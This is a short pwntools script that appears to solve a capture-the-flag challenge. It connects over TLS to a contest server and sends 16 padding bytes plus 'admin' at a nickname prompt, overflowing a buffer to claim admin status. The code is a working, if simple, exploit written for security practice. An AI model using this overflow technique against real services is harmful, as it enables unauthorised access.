from pwn import *

context.log_level = "debug"
io = remote("skillsusa.cybr.club", 443, ssl=True, sni="overwrite")

# Create payload: 16 bytes of padding + "admin\n"
payload = b"A" * 16 + b"admin\n"

# Send the payload when prompted
io.recvuntil(b"Enter a nickname here:")
io.sendline(payload)

# Switch to interactive mode to see the output
io.interactive()
